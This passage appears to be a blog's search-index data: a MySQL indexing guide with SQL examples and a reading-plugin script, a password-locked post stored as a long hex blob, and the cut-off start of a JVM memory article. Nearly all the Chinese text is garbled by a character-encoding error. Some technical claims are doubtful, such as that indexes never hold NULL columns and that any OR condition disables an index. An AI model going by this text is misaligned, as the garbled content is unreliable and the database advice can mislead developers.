ä¸ºéœ€è¦åˆ†é…ç£ç›˜ç©ºé—´ç»™ç´¢å¼•æ–‡ä»¶ï¼Œä¸€èˆ¬æƒ…å†µè¿™ä¸ªé—®é¢˜ä¸å¤ªä¸¥é‡ï¼Œä½†å¦‚æœåœ¨ä¸€ä¸ªå¤§è¡¨ä¸Šåˆ›å»ºäº†å¤šç§ç»„åˆç´¢å¼•ï¼Œç´¢å¼•æ–‡ä»¶çš„ä½“ç§¯ä¼šè†¨èƒ€å¾—å¾ˆå¿« ç´¢å¼•é€‚ç”¨çš„åœºæ™¯ç´¢å¼•åˆ›å»ºçš„æ—¶æœºä¸€èˆ¬æ¥è¯´ï¼Œåœ¨ WHERE å’Œ JOIN å­å¥ä¸­å‡ºç°çš„åˆ—éœ€è¦å»ºç«‹ç´¢å¼•ï¼Œä½†ä¹Ÿä¸å®Œå…¨å¦‚æ­¤ï¼Œå› ä¸º MySQL åªå¯¹ &lt;ã€&lt;=ã€=ã€&gt;ã€&gt;=ã€BETWEENã€IN ä»¥åŠæŸäº›æ—¶å€™çš„ LIKE æ‰ä¼šä½¿ç”¨ç´¢å¼•ã€‚ä¾‹å¦‚ä¸‹è¿°çš„ SQL è¯­å¥ï¼Œå°±éœ€è¦å¯¹ city å’Œ age åˆ—å»ºç«‹ç´¢å¼•ï¼Œç”±äº mytable_m è¡¨çš„ userame ä¹Ÿå‡ºç°åœ¨äº† JOIN å­å¥ä¸­ï¼Œå› æ­¤ä¹Ÿæœ‰å¯¹å®ƒå»ºç«‹ç´¢å¼•çš„å¿…è¦ã€‚ 1SELECT t.Name FROM mytable_t LEFT JOIN mytable_m ON t.Name=m.username WHERE m.age=20 AND m.city=\'éƒ‘å·\' ; ç‰¹åˆ«æ³¨æ„ï¼šä¸Šé¢æåˆ°åªæœ‰æŸäº›æ—¶å€™çš„ LIKE æ‰éœ€å»ºç«‹ç´¢å¼•ï¼Œå› ä¸ºåœ¨ä»¥é€šé…ç¬¦ % å¼€å¤´ä½œæŸ¥è¯¢æ—¶ï¼ŒMySQL ä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼›åªæœ‰ä»¥é€šé…ç¬¦ % ç»“å°¾åšæŸ¥è¯¢æ—¶ï¼ŒMySQL æ‰ä¼šä½¿ç”¨åˆ°ç´¢å¼•ã€‚ä½†æœ‰ä¸€ç§æƒ…å†µä¾‹å¤–ï¼Œé‚£å°±æ˜¯å½“è§¦å‘äº†è¦†ç›–ç´¢å¼•ï¼ˆselect çš„æ•°æ®åˆ—åªä»ç´¢å¼•ä¸­å°±èƒ½å¤Ÿå–å¾—ï¼Œä¸å¿…è¯»å–æ•°æ®è¡Œï¼Œæ¢å¥è¯è¯´æŸ¥è¯¢åˆ—è¦è¢«æ‰€å»ºçš„ç´¢å¼•è¦†ç›–ï¼‰çš„æƒ…å†µä¸‹ï¼Œä»¥é€šé…ç¬¦ % å¼€å¤´ä½œæŸ¥è¯¢ MySQL ä¹Ÿä¼šä½¿ç”¨ç´¢å¼•ã€‚ä¾‹å¦‚ï¼šå¦‚æœè¡¨é‡Œé¢åªæœ‰ id å’Œ username ä¸¤ä¸ªå­—æ®µä¸”éƒ½åŠ äº†ç´¢å¼•ï¼Œé‚£ä¹ˆ select * like \'%username\' æŸ¥è¯¢ä¹Ÿæ˜¯ä¼šä½¿ç”¨ç´¢å¼•çš„ï¼Œå‰ææ˜¯ select æ•°æ®åˆ—éƒ½åŠ äº†ç´¢å¼•ã€‚ å“ªäº›å­—æ®µåº”è¯¥åˆ›å»ºç´¢å¼• å¢åˆ æ”¹éå¸¸é¢‘ç¹çš„å­—æ®µä¸é€‚åˆä½œä¸ºç´¢å¼• æŸ¥è¯¢ä¸­ä¸å…¶ä»–è¡¨å…³è”çš„å­—æ®µï¼Œä¾‹å¦‚å¤–é”®åº”è¯¥å»ºç«‹ç´¢å¼• WHERE å’Œ JOIN å­å¥ä¸­ï¼Œè¾ƒé¢‘ç¹ä½œä¸ºæŸ¥è¯¢æ¡ä»¶çš„å­—æ®µåº”è¯¥åˆ›å»ºç´¢å¼• æŸ¥è¯¢ä¸­æ’åºï¼ˆorder byï¼‰ã€åˆ†ç»„ï¼ˆgroup byï¼‰ã€ç»Ÿè®¡çš„å­—æ®µåº”è¯¥å»ºç«‹ç´¢å¼• å”¯ä¸€æ€§å¤ªå·®çš„å­—æ®µä¸é€‚åˆåˆ›å»ºç´¢å¼•ï¼Œå°½ç®¡é¢‘ç¹ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šæ€§åˆ«å­—æ®µ ç´¢å¼•ä¸ç”Ÿæ•ˆçš„æƒ…å†µ å¯¹äºå¤šåˆ—ç´¢å¼•ï¼Œå¦‚æœä¸æ˜¯ä½¿ç”¨çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç´¢å¼• å¦‚æœ MySQL ä¼°ç®—ä½¿ç”¨å…¨è¡¨æ‰«æè¦æ¯”ä½¿ç”¨ç´¢å¼•å¿«ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ç´¢å¼• like æŸ¥è¯¢ï¼Œå³æ˜¯ä»¥ % å¼€å¤´çš„æŸ¥è¯¢ä¸ä¼šä½¿ç”¨ç´¢å¼•ï¼Œé™¤é select æ•°æ®åˆ—éƒ½åŠ äº†ç´¢å¼• å¦‚æœåˆ—ç±»å‹æ˜¯å­—ç¬¦ä¸²ï¼Œé‚£ä¸€å®šè¦åœ¨æ¡ä»¶ä¸­å°†æ•°æ®ä½¿ç”¨å•å¼•å·åŒ…èµ·æ¥ï¼Œå¦åˆ™ç´¢å¼•ä¸ç”Ÿæ•ˆ å¦‚æœæ¡ä»¶ä¸­æœ‰ orï¼Œå³ä½¿å…¶ä¸­æœ‰éƒ¨åˆ†æ¡ä»¶å¸¦ç´¢å¼•ä¹Ÿä¸ä¼šä½¿ç”¨ã€‚æ¢è¨€ä¹‹ï¼Œå¿…é¡»æ‰€æœ‰åˆ—éƒ½å»ºæœ‰ç´¢å¼•æ‰æœ‰æ•ˆ ç´¢å¼•ä½¿ç”¨æ³¨æ„äº‹é¡¹ é’ˆå¯¹æ™®é€šæŸ¥è¯¢ é¿å…ä½¿ç”¨ select * è¿è¡¨æ—¶æ³¨æ„æ¡ä»¶ç±»å‹éœ€ä¸€è‡´ åˆ›å»ºè¡¨æ—¶å°½é‡æ—¶ char ä»£æ›¿ varchar &nbsp;count (1) æˆ– count (åˆ—) ä»£æ›¿&nbsp;count (*) ä½¿ç”¨è¡¨è¿æ¥ï¼ˆJOINï¼‰æ¥ä»£æ›¿å­æŸ¥è¯¢ï¼ˆSub-Queriesï¼‰ é’ˆå¯¹ç´¢å¼•ä½¿ç”¨ ä½¿ç”¨ç»„åˆç´¢å¼•ä»£æ›¿å¤šä¸ªå•åˆ—ç´¢å¼•ï¼ˆç»å¸¸ä½¿ç”¨å¤šä¸ªæ¡ä»¶æŸ¥è¯¢æ—¶ï¼‰ ç´¢å¼•æ•£åˆ—å€¼ï¼ˆé‡å¤å¤šçš„å€¼ï¼‰ä¸é€‚åˆå»ºç´¢å¼•ï¼Œä¾‹å¦‚ï¼šæ€§åˆ«å­—æ®µä¸é€‚åˆå»ºç´¢å¼• ç´¢å¼•ä¸ä¼šåŒ…å«æœ‰ NULL å€¼çš„åˆ—ï¼Œåªè¦åˆ—ä¸­åŒ…å«æœ‰ NULL å€¼éƒ½å°†ä¸ä¼šè¢«åŒ…å«åœ¨ç´¢å¼•ä¸­ï¼Œç»„åˆç´¢å¼•ä¸­åªè¦æœ‰ä¸€åˆ—å«æœ‰ NULL å€¼ï¼Œé‚£ä¹ˆè¿™ä¸€åˆ—å¯¹äºæ­¤ç»„åˆç´¢å¼•å°±æ˜¯æ— æ•ˆçš„ï¼Œå› æ­¤åœ¨æ•°æ®åº“è®¾è®¡æ—¶ä¸è¦è®©å­—æ®µçš„é»˜è®¤å€¼ä¸º NULL ä¸è¦åœ¨åˆ—ä¸Šè¿›è¡Œè¿ç®—ï¼Œä¾‹å¦‚ select * from users where YEAR(adddate)&lt;2007ï¼Œå°†åœ¨æ¯ä¸ªè¡Œè®°å½•ä¸Šè¿›è¡Œè¿ç®—ï¼Œè¿™å°†å¯¼è‡´ç´¢å¼•å¤±æ•ˆè€Œè¿›è¡Œå…¨è¡¨æ‰«æï¼Œå› æ­¤å¯ä»¥æ”¹æˆ select * from users where adddate&lt;â€™2007-01-01â€² å°½é‡ä½¿ç”¨çŸ­ç´¢å¼•ï¼Œå¯¹ä¸²åˆ—è¿›è¡Œç´¢å¼•ï¼Œå¦‚æœå¯èƒ½åº”è¯¥æŒ‡å®šä¸€ä¸ªå‰ç¼€é•¿åº¦ã€‚ä¾‹å¦‚ï¼šå¦‚æœæœ‰ä¸€ä¸ª CHAR (255) çš„åˆ—ï¼Œå¦‚æœåœ¨å‰ 10 ä¸ªæˆ– 20 ä¸ªå­—ç¬¦å†…ï¼Œå¤šæ•°å€¼æ˜¯æƒŸä¸€çš„ï¼Œé‚£ä¹ˆå°±ä¸è¦å¯¹æ•´ä¸ªåˆ—è¿›è¡Œç´¢å¼•ï¼›çŸ­ç´¢å¼•ä¸ä»…å¯ä»¥æé«˜æŸ¥è¯¢é€Ÿåº¦ï¼Œè¿˜å¯ä»¥èŠ‚çœç£ç›˜ç©ºé—´å’Œ I/O æ“ä½œ MySQL 5.0 ä¹‹å‰ï¼ŒSQL æŸ¥è¯¢åªèƒ½ä½¿ç”¨ä¸€ä¸ªç´¢å¼•ï¼Œå› æ­¤å¦‚æœ WHERE å­å¥ä¸­å·²ç»ä½¿ç”¨äº†ç´¢å¼•çš„è¯ï¼Œé‚£ä¹ˆ order byã€group by ä¸­çš„åˆ—æ˜¯ä¸ä¼šä½¿ç”¨ç´¢å¼•çš„ã€‚å› æ­¤å¦‚æœæ•°æ®åº“é»˜è®¤æ’åºå¯ä»¥ç¬¦åˆè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œä¸è¦ä½¿ç”¨æ’åºæ“ä½œï¼ŒåŒæ—¶å°½é‡ä½¿ç”¨ä¸åŒ…å«å¤šä¸ªåˆ—çš„æ’åºï¼Œå¦‚æœéœ€è¦æœ€å¥½ç»™è¿™äº›åˆ—åˆ›å»ºç»„åˆç´¢å¼• æŸ¥çœ‹ç´¢å¼•çš„ä½¿ç”¨æ•ˆæœæ‰§è¡Œè®¡åˆ’Explain + æŸ¥è¯¢ SQLï¼Œç”¨äºæ˜¾ç¤º SQL æ‰§è¡Œä¿¡æ¯å‚æ•°ï¼Œæ ¹æ®å‚è€ƒä¿¡æ¯å¯ä»¥è¿›è¡Œ SQL ä¼˜åŒ–æˆ–è€…åˆ¤æ–­ç´¢å¼•æ˜¯å¦ç”Ÿæ•ˆ æŸ¥çœ‹ç´¢å¼•çš„ä½¿ç”¨æƒ…å†µ1show status like \'%Handler_read%\'; handler_read_keyï¼šè¿™ä¸ªå€¼è¶Šé«˜è¶Šå¥½ï¼Œè¶Šé«˜è¡¨ç¤ºä½¿ç”¨ç´¢å¼•æŸ¥è¯¢åˆ°çš„æ¬¡æ•°è¶Šå¤š handler_read_rnd_nextï¼šè¿™ä¸ªå€¼è¶Šé«˜ï¼Œè¯´æ˜æŸ¥è¯¢æ•ˆç‡ä½æ•ˆ è¡¥å……è¯´æ˜MySQL æŸ¥è¯¢åªèƒ½ä½¿ç”¨ä¸€ä¸ªç´¢å¼•ï¼ŸMySQL 5.0 ä¹‹å‰ï¼ŒSQL æŸ¥è¯¢åªèƒ½ä½¿ç”¨ä¸€ä¸ªç´¢å¼•ï¼Œæ‰€ä»¥è¦åˆç†ä½¿ç”¨ç»„åˆç´¢å¼•ï¼Œè€Œä¸æ˜¯å•åˆ—ç´¢å¼•ã€‚ä¸å…¶è¯´æ˜¯ â€œæ•°æ®åº“æŸ¥è¯¢åªèƒ½ç”¨åˆ°ä¸€ä¸ªç´¢å¼•â€ï¼Œå€’ä¸å¦‚è¯´å’Œå…¨è¡¨æ‰«æã€åªä½¿ç”¨ä¸€ä¸ªç´¢å¼•çš„æŸ¥è¯¢é€Ÿåº¦æ¯”èµ·æ¥ï¼Œå»åˆ†æå¤šä¸ªç´¢å¼•äºŒå‰æ ‘æ›´åŠ è€—è´¹æ—¶é—´ï¼Œæ‰€ä»¥ç»å¤§å¤šæ•°æƒ…å†µä¸‹æ•°æ®åº“éƒ½æ˜¯ç”¨ä¸€ä¸ªç´¢å¼•ã€‚ç‰¹åˆ«æ³¨æ„ï¼šä» MySQL 5.1 å¼€å§‹ï¼Œå¼•å…¥äº†ç´¢å¼•åˆå¹¶ä¼˜åŒ–æŠ€æœ¯ï¼Œå¯¹åŒä¸€ä¸ªè¡¨å¯ä»¥ä½¿ç”¨å¤šä¸ªç´¢å¼•åˆ†åˆ«è¿›è¡Œæ¡ä»¶æ‰«æã€‚ 1select count(1) from table1 where column1 = 1 and column2 = \'foo\' and column3 = \'bar\'; ä¾‹å¦‚ä¸Šé¢çš„è¯­å¥ï¼Œå½“æ•°æ®åº“æœ‰ N ä¸ªç´¢å¼•å¹¶ä¸”æŸ¥è¯¢ä¸­åˆ†åˆ«éƒ½è¦ç”¨ä¸Šå®ƒä»¬çš„æƒ…å†µä¸‹ï¼šæŸ¥è¯¢ä¼˜åŒ–å™¨ï¼ˆç”¨äºç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼‰éœ€è¦è¿›è¡Œ N æ¬¡ä¸»äºŒå‰æ ‘æŸ¥æ‰¾ï¼ˆè¿™é‡Œä¸»äºŒå‰æ ‘çš„æ„æ€æ˜¯æœ€å¤–å±‚çš„ç´¢å¼•èŠ‚ç‚¹ï¼‰ï¼Œæ­¤æ—¶çš„æŸ¥æ‰¾æµç¨‹å¤§æ¦‚æ˜¯ï¼šæŸ¥å‡ºç¬¬ä¸€æ¡ column1 ä¸»äºŒå‰æ ‘ç­‰äº 1 çš„å€¼ï¼Œç„¶åå»ç¬¬äºŒæ¡ column2 ä¸»äºŒå‰æ ‘æŸ¥å‡º foo çš„å€¼å¹¶ä¸”å½“å‰è¡Œçš„ coumn1 å¿…é¡»ç­‰äº 1ï¼Œæœ€åå» column3 ä¸»äºŒå‰æ ‘æŸ¥æ‰¾ bar çš„å€¼å¹¶ä¸” column1 å¿…é¡»ç­‰äº 1 å’Œ column2 å¿…é¡»ç­‰äº fooã€‚å¦‚æœè¿™æ ·çš„æµç¨‹è¢«æŸ¥è¯¢ä¼˜åŒ–å™¨æ‰§è¡Œä¸€éï¼Œå°±ç®—ä¸æ­»ä¹ŸåŠæ¡å‘½äº†ï¼ŒæŸ¥è¯¢ä¼˜åŒ–å™¨å¯ç­‰ä¸åŠæŠŠä»¥ä¸Šè®¡åˆ’éƒ½æ‰§è¡Œä¸€éï¼Œè´ªå©ªç®—æ³•ï¼ˆæœ€è¿‘é‚»å±…ç®—æ³•ï¼‰å¯ä¸å…è®¸è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚æ‰€ä»¥å½“é‡åˆ°ä¸Šé¢çš„è¯­å¥ï¼Œæ•°æ®åº“åªè¦ç”¨åˆ°ç¬¬ä¸€ä¸ªç­›é€‰åˆ—çš„ç´¢å¼•ï¼ˆcolumn1ï¼‰ï¼Œå°±ä¼šç›´æ¥å»è¿›è¡Œè¡¨æ‰«æäº†ã€‚æ‰€ä»¥ä¸å…¶è¯´æ˜¯æ•°æ®åº“åªæ”¯æŒä¸€æ¡æŸ¥è¯¢è¯­å¥åªä½¿ç”¨ä¸€ä¸ªç´¢å¼•ï¼Œå€’ä¸å¦‚è¯´ N ä¸ªç‹¬ç«‹ç´¢å¼•åŒæ—¶åœ¨ä¸€æ¡è¯­å¥ä½¿ç”¨çš„å¼€é”€æ¯”åªä½¿ç”¨ä¸€ä¸ªç´¢å¼•è¿˜è¦å¤§ã€‚æœ€ä½³æ¨èæ˜¯ä½¿ç”¨ index(column1, column2, column3ï¼‰ è¿™ç§ç»„åˆç´¢å¼•ï¼Œæ­¤ç»„åˆç´¢å¼•å¯ä»¥æŠŠ B+Tree ç»“æ„çš„ä¼˜åŠ¿å‘æŒ¥å¾—æ·‹æ¼“å°½è‡´ã€‚ä¸€æ¡ä¸»äºŒå‰æ ‘ï¼ˆcolumn=1ï¼‰ï¼ŒæŸ¥è¯¢åˆ°ï¼ˆcolumn=1ï¼‰èŠ‚ç‚¹ååŸºäºå½“å‰èŠ‚ç‚¹è¿›è¡ŒäºŒçº§äºŒå‰æ ‘ï¼ˆcolumn2=fooï¼‰çš„æŸ¥è¯¢ï¼Œåœ¨äºŒçº§äºŒå‰æ ‘æŸ¥è¯¢åˆ°ï¼ˆcolumn2=fooï¼‰åï¼Œå»ä¸‰çº§äºŒå‰æ ‘ï¼ˆcolumn3=barï¼‰æŸ¥æ‰¾ï¼Œè¿™æ ·æŸ¥è¯¢æ•ˆç‡ä¼šé«˜è·Ÿå¤šã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"æ•°æ®åº“"},{title:"æµ·ç åŒºæ±Ÿå—è¥¿è·¯æ¸¸ç©æ”»ç•¥",url:"/posts/c7942874.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff0779ed4b5f8e44b38cb5cd33ddb3f5e17d738ccb05f48b4402c7881c3e63234c8feab92be78f929c4380d2531414e4729185acc02e933bc3c0af637267fa0250c33a22ad3ac3073bd799fabe2cff5637f8866619450f1942597d62754d0c5bfb17b193a5f2a307dd6372a1b4a5767d5dfa7807263461a6445a04c26f38b7d2d0bfe5c09001d6797fc7301172ca92e49825a0abed29a62aec5940ca20d0e8ba726d4160c64aec06bfd21d0c957c181cc5df0ec501aee6486e3a5f922b313134a0f39d95e1a718958277c437578a2008bc56a80f28a32a94318799fa60299e88af8dfaacd2dd0b14861e50ffa61f2299fd448181f47668122d0286a58569160e3ad0a83cc3616a688a66b9ec18af7e9d116dde6c21f14c6b0052a03f3d959e777d06ae6b142a844a3024b1dafafcc585ba005be9cf40c9e1409d6edf2b07dbfb64e120e5049bc3d3e99535cb211356f4be0e74058e8cbe919565d6eb80c445f839f4f2f0d2dc00f4456a2d0edf524d0aff7b16622a6bc6f7e49d63065cdc04791679b796d7dab30d3acd4a19f06425825c52065b670757e1877f4cb4145b9321dc945d04de2ff139bf1942dbce38e761d9ff3fb19614ce249fa132c8c42ec6f2f522625d274576ae1e4bc137182bb12da631c8097880875d5911282b947fd00a8382b40570e060dbe686ddfc1033754aec6466abbf4a5424ce6830292ac52217187a3abaa52870aa9476502f931721c9d7f507e2e2c146b600958408204737cce7e062fa0e9739e6abf2a11ce5c8ef1960fdffb064fc225f2a0c563ffd9b2c8c5e451e1fcb957a3412c6d0b002c356dee70b13656bad862040019d19a15ccb60ab0d405818fe96a19d3ee9094bb677e1d1113b0d6643d0c479a5a959c01b9ebbd6a12c8b2ef0fe2e75a5503a2cb305f64a25194cb96b91c5dab093355573a705043e4d4cc00c9fd7d85271c88ec8d2e4d8536f35a0c1d51a6204a8b7c5114fec57c63bdc7650ca12fb866fe32466639027e0ec09fd0d2ffeaedac64cda547c0614194dbb2b7a9c3dbdc36d74548a5121db7d16f17860c3e7fad6fb711e371940deab7b6fc39434330264843ecd76da88030dc81f429ad0bdeba0e298746035f94abeb19c22a4996c2aae3071ddf36bb50a0f5fdceb674c286088b5404fd62b00ef2e0e3131b0f2d70f478114996b0912e9fa82a2f4bd6733cbd51913a1fc79f81b0ba9482f7952b6a235f7c1f0648253952d3db05ea08ff5f7f43bf939b1b0166f349164ef1542e6d3b924b5ffd50469271de0067b705179f41c925af10b947d293def32cbe3bcb44e289a46a5300be199a7abbb76865403321531901d5a686341e3a02b0410e2698af0ac012e25ac7c384091554a7445ebe02d0652d9d6d328b02640c03a042bf28947f0e06f14906390a038ba0d9117ea887f7d4b035147795f0d3edfdcaaba7c40e023a517ab4c6466a973c2f5ccd1a6a6f27a9a5472bd6e6fd678dd3be27068de5397b6d57f180147a9bf5bd80fcaebcb4d20b6fccd3f6112886834828711808734e2dcb8145d6e03ea2b449c736b7181a47936d22341339fac2cbe343b38a9bb6b3a372e5c0d34c35e595e0f902d621ee0d4142616f293549232512f83a3b47c82985b3d6f0d07283a18e44663aa16fa79dc27c033de0d64305e229032970044c18c58791c29d5e1fc62c546f949ea7586b467ab0be781e7d59734009773e420b3b266cd339f84d689f826d8f55ac2b37bdaced95fb9cf8dd5cb125f8772120c790135c0bbba03cc775a21799be0146b4c696880a53edd80d68716a757fcfe8c29e3cc08a2628c341162ea152a7c512988f74817e6d349e554a6c7bcacbc6ab349a500468029544087d334d181560b5a5d0ee35ef44bc77ed92968fe6ab5b3a06a079e128a8ec3ab439bad9999e52909f0b9263bab7c195071a3fe97f5f19623986ec1373c8c61842699a26257a0e4b081a08424e8f047888ac113baa9930191988c564edf0f5e8bed2a461a51db4271a759b9ac3e91a0d84137dd6fab99f6b444cc2854e392c15f56344a7ef0d7812818d145b1f76fe79a30f0d25512b5875d0cce0ad6b3fa15e4f187789c68650c14ab5408f4b41045db4f04d45293f207dca3b136a3905722b363521c0d7e7fc982b55b8f35eb10c1a831148f59e75c137a11bbabc12bc8b1e5958070870e1934c4948e8c04f95bedd0b126c566b5437149e7a5fedf9b1ccd2fbf7ca66ee2d372209b106bb1067efbd981f728744958696d16a4f6ad9f006aabe44bf831724937192fe9def71181d5b3bb085543a894042b2fea20e89e831bc235db2f39c7fb6747fed074d1d4b74397e0e139c93af7be3251c4a90d4c52571240728188257d76ed7e19555f81a61846986b31bd4395a31c5bdd94b8f138d3ff22d1827f1c85ffe75eaee547fe5c90b70ded5fc14213846a21a908f77065408bbe9f54f4635bd724f65b9e7694eb08bbb5e0d20b41276f4e16b2ad809e7586299fb4fe0934bc41e64c8dd92526e90d8ddad9ee7f8b28a0a99a6eb3c9e4259245068a46eab7f9e223b9af856f9a011b1f8c76dab3f72d4f1b035cf9b2ca81280f4b5c9802a096b90b37d8a865e8a9e0ac437a1b995483ba565c711f68eeec2f0ace40b511889a41b7dbd16ae49ca08f4f5c5f6e0c8806356e50e4656f64da94af217db7b526d894fb6873b4578dedf84f04315646c118a8320f87c3af04f56091e12d2501700d94246f12654355c3a12a2822f2d442890653780b80f16959d04dea553648f33fd52ab0d709ca56b9fe3297fe75209559883347d9ed4e91679827943c66e4f95cd7114e344cd1a50ce83dd744682362a725e2f13aac0fa51e5afc02352399d79d22a1b4edcbd2a5aa8054771ac0feba3508490cc380cd2534681327fb7ff00a06f43bc02e98e83168f315162ed82af569e6098bce540d28a3c282aa25d1a58c73cf879c030ba2c59b4ccfbd8af5f880fa25f5e5623702c51952d0c96348524c9239249212a5c79e8d4beb90b9c1a64410a756d3cf50d8e28069be0534a57ae1a9a93ba4394feee0ff5752d79a88e3c41aff8ca2851a9ee8916a37224312da82afb2e4971bd14d01327cc730cc877a6039ed56d22a1f233fae43cfd54aa65abbeb01f5bfaa2c39c7d9b8e35c7a43f7ea306dc521a50deed420e5527b406d4477fd6169a9cb256f48433acbdb1fffa98b734a137058eb82e882aa5a3ce73554019bc8b6ac6ce69ca85afeb5df87277d85ebfd123c439f92923816448703e01bde018d65811bdace3db3ac8664e66f3a878eb72e27aebc2244c519ddac3ff0d01778a1019c572ca35edf7449dbdfff0c2876cfee20d838a66d521f418602175a563c10cb190b926415d4067e2e4770eb5ef24e49637ccad4bb99820fa194cad240781f30d7461bdf9baea898a45a67dc0a69a0c2287d0350d8c424e41178eac4349f3dd5feb157ae6582f6fbcd8d5cf1a528b9d31542d0e5258c50704d0a0c88e72286525f8f99ca91735b9877a586e95ac84ba497ef3d34fc4db22e35b48d594cf9428af95dc42fbfce51cd1483129e33a4125d4d2ef48c733d9185d7aa03c92f5e4b58344aeb9b1414987013ec4d020a69c8d58d820dc78937be0702d7593d0186d702a78b25d522743a70ee5af1ae8c27f9a37e87855b827c5394dd4598e7d09d6662e8e57bce925106fb82f493e0b0ece63696c1f59d8e13964141756465a3086969e17182d726e99db089baf5cf0a5f0d5808dbab28f42c4d63b8f97ad6d1313d2a1e269e153919b2c56059a0fcb0e453fb201592bb64b7acd79eadba82ad245aa044f5cebf4d8560ff54a6a779fe7e8504769b9fed31f37c7dff6063b0d97a9d3d07394f69cb9edda4784749938d49305807815bafbf1d4528ae612e44aaab9388050ee45836754d98580fa004d6687fdf7fdae6d4162821f4aeb78425b44e52f4374a8e21deaaafc8af86f7bd1e23d1e28da19ff886daca17fb9d02c7a959ed9db20f34dac28511406232cf73880934073b6327f7b19cdd7612082089c54d108d824238e65947aff2fd29c490b286bb73b848080c737788d1cd9f13ede679c8dd8080f5274fad9e12915c0aa280270621a2d92d5ad8ea1e981b1b328fea1dcd627732780a7b7994b46a17140a1e9227e6fad852a37ffc3c064d544ea49cc490377796615c10077176a39ae3938e1e7fc92f40449928658b648be8d1ac02e549e76d6e94b63827fc1962487727360cd994dee0515494e582910085c91de59d4af7152820aa3a9181204e5113554165cd7c9450531af41d49e0c97a1afe77528500d854b95350eb441a906faed73e2e050d96f4b63bc7b071dd78f87f2bc9847dfdd1709b55ee79e27d8bcaf65e9a5c85111d5b691be9051d8ce06d4912ddb2aa6b17ce2bfcb5f9efccb587eb3ebdbdf312644afc7eef10b87977f862f71440d2e47d37f56799d3351b0987b8980eaec4893524dbb8bf021c7ecc088a1b8ba2b19272c971f2195180d765810d765418501f7d1fa2c6c68661a206e7a091016b6d7a5fa638e4ea3a77331d1566850b0b4bc2bdc3f36826bb346c766b2825181cf0bd85f6ce012667c9db691078cc6940930a09505a26e9a8d153c1483815f53d7aaa0c0a3306708baf2655e9b362120b7f12b155d76a636830b3b2f56bfbdf841069eac0463b46991dedf5e6899190b619e70875151f2584bd202c110820365c57cd83b55840b35aa1f3f207d67c061db3eb2ac11ffa68e80dc9606e8c46672a3ec0b565033ccec6e170bb6be6532b6674f3e9e9cce5aae9890ad445014b2c87b7d0c28893bba4c7cba1d5094d48cea0c63461105bc5cbda4467158abb0c5d59e405d76e27390bf763c8154926ba4f76e9d8c5d64658cc866795a86d3791ef16e6026e2205567ebf1d533e131363ea600a59d0cf267d63e726224aa3a34784ab62a6fc9803085ee8be60 è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢ æ¸¸ç©æ”»ç•¥"},{title:"JVM å†…å­˜ç»“æ„ä¸ GC ç®—æ³•",url:"/posts/2f77f23a.html",text:'Java è™šæ‹ŸæœºJVM å†…å­˜ç»“æ„JVM å†…å­˜ç»“æ„ä¸»è¦æœ‰ä¸‰å¤§å—ï¼šæ ˆã€å †å†…å­˜ã€æ–¹æ³•åŒºã€‚å †å†…å­˜æ˜¯ JVM ä¸­æœ€å¤§çš„ä¸€å—ï¼Œç”±æ–°ç”Ÿä»£å’Œè€å¹´ä»£ç»„æˆï¼Œä¸åŒ…æ‹¬æ°¸ä¹…ä»£ï¼ˆæ–¹æ³•åŒºï¼‰ï¼›è€Œæ–°ç”Ÿä»£å†…å­˜åˆè¢«åˆ†æˆ Eden ç©ºé—´ã€From Survivor ç©ºé—´ã€To Survivor ç©ºé—´ï¼Œé»˜è®¤æƒ…å†µä¸‹æ–°ç”Ÿä»£æŒ‰ç…§ 8:1:1 çš„æ¯”ä¾‹æ¥åˆ†é…ã€‚æ–¹æ³•åŒºå­˜å‚¨ç±»ä¿¡æ¯ã€é™æ€å˜é‡ã€å¸¸é‡ã€å¸¸é‡æ± ç­‰æ•°æ®ï¼Œæ˜¯çº¿ç¨‹å…±äº«çš„åŒºåŸŸï¼Œä¸ºäº†ä¸ Java å †åŒºåˆ†ï¼Œæ–¹æ³•åŒºè¿˜æœ‰ä¸€ä¸ªåˆ«å Non-Heap ï¼ˆéå †ï¼‰ã€‚æ ˆåˆåˆ†ä¸º Java è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆï¼Œä¸»è¦ç”¨äºæ–¹æ³•çš„æ‰§è¡Œã€‚ å †å†…å­˜å †å†…å­˜ï¼ˆHeapï¼‰æ˜¯ Java 